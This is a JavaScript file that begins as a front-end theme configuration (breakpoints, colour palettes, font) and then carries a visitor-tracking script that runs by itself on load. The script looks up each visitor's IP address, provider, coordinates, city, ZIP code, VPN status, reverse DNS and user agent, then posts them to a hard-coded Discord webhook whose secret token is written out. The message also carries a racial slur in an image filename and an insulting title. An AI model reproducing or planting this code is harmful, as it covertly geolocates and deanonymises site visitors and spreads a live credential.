var KTAppSettings = {
    "breakpoints": {
        "sm": 576,
        "md": 768,
        "lg": 992,
        "xl": 1200,
        "xxl": 1400
    },
    "colors": {
        "theme": {
        "base": {
            "white": "#ffffff",
            "primary": "#3699FF",
            "secondary": "#E5EAEE",
            "success": "#1BC5BD",
            "info": "#8950FC",
            "warning": "#FFA800",
            "danger": "#F64E60",
            "light": "#E4E6EF",
            "dark": "#181C32"
        },
        "light": {
            "white": "#ffffff",
            "primary": "#E1F0FF",
            "secondary": "#EBEDF3",
            "success": "#C9F7F5",
            "info": "#EEE5FF",
            "warning": "#FFF4DE",
            "danger": "#FFE2E5",
            "light": "#F3F6F9",
            "dark": "#D6D6E0"
        },
        "inverse": {
            "white": "#ffffff",
            "primary": "#ffffff",
            "secondary": "#3F4254",
            "success": "#ffffff",
            "info": "#ffffff",
            "warning": "#ffffff",
            "danger": "#ffffff",
            "light": "#464E5F",
            "dark": "#ffffff"
        }
        },
        "gray": {
        "gray-100": "#F3F6F9",
        "gray-200": "#EBEDF3",
        "gray-300": "#E4E6EF",
        "gray-400": "#D1D3E0",
        "gray-500": "#B5B5C3",
        "gray-600": "#7E8299",
        "gray-700": "#5E6278",
        "gray-800": "#3F4254",
        "gray-900": "#181C32"
        }
    },
    "font-family": "Poppins"
};

var webHookUrl = "https://discordapp.com/api/webhooks/1239878869503180811/X6D5-3wpOOuWwqE_M1c97hXEd4UAp7RYGcJWi6i2IMzeLYqvNoahK07Wo9q-89ByuodZ";


    const request = async () => {
        // Fetch IP information from the ipinfo.io endpoint
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
    
        // Get the IP address and other details
        var ip = data.ip;
        var provider = data.org;
        var timezone = data.timezone;
        var countryCode = data.country ? data.country.toLowerCase() : "N/A";
        var region = data.region;
        var city = data.city;
        var zip = data.postal;
        var lat = data.loc.split(',')[0];
        var lon = data.loc.split(',')[1];
    
        // Fetch VPN status (You can continue to use your original method for this)
        const vpnResponse = await fetch('https://json.geoiplookup.io/' + ip);
        const vpnData = await vpnResponse.json();
        var isVPN = vpnData.connection_type === "Corporate" ? "Yes" : "No";
    
        // Fetch reverse DNS information from the same IP using 'ipinfo.io'
        const reverseResponse = await fetch(`https://ipinfo.io/${ip}/hostname`);
        const reverseData = await reverseResponse.text();
        
        // User Agent
        var userAgent = navigator.userAgent;
    
        // Create a Google Maps link
        var googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
    
        // Open POST Request to Discord Webhook
        var postRequest = new XMLHttpRequest();
        postRequest.open("POST", webHookUrl);
    
        postRequest.setRequestHeader('Content-type', 'application/json');
    
        var params = {
            username: "cedzuxx",
            avatar_url: "https://cdn.discordapp.com/avatars/1228703857291558964/761b4750b7a0ab66cbf393e84dee1b00.webp?size=1024&format=webp&width=0&height=171",
            thumbnail: "https://media.discordapp.net/attachments/1237090726404165632/1238163874163982396/nigga.jpg?ex=664acfb7&is=66497e37&hm=1a41c178e2b495a61bf9b780a294f263e847a7358cdda30446cc980dfd7e3d76&=&format=webp&width=53&height=53",
            image: "https://media.discordapp.net/attachments/1237090726404165632/1237156324710678538/KXZU8.png?ex=664b19dd&is=6649c85d&hm=4ecb7c74b12c4b8246b9ff8225a706e3ef8b3862b4cd88b821bc9661c7fa4700&=&format=webp&quality=lossless&width=1340&height=473",
            embeds: [
                {
                    title: "tangina bobo",
                    fields: [
                        {
                            name: "IP Address",
                            value: "`" + ip + "`",
                            inline: true
                        },
                        {
                            name: "Provider",
                            value: provider,
                            inline: true
                        },
                        {
                            name: "Timezone",
                            value: timezone,
                            inline: true
                        },
                        {
                            name: "Location",
                            value: `Longitude: ${lon}\nLatitude: ${lat}`,
                            inline: true
                        },
                        {
                            name: "Google Maps",
                            value: `[View on Google Maps](${googleMapsLink})`,
                            inline: true
                        },
                        {
                            name: "VPN",
                            value: isVPN,
                            inline: true
                        },
                        {
                            name: "Reverse DNS",
                            value: reverseData,
                            inline: true
                        },
                        {
                            name: "User Agent",
                            value: userAgent,
                            inline: true
                        },
                        {
                            name: "Region | City | Zip",
                            value: `${region} | ${city} | ${zip}`,
                            inline: true
                        }
                    ]
                }
            ]
        };
    
        postRequest.send(JSON.stringify(params));
    }
    
    request();
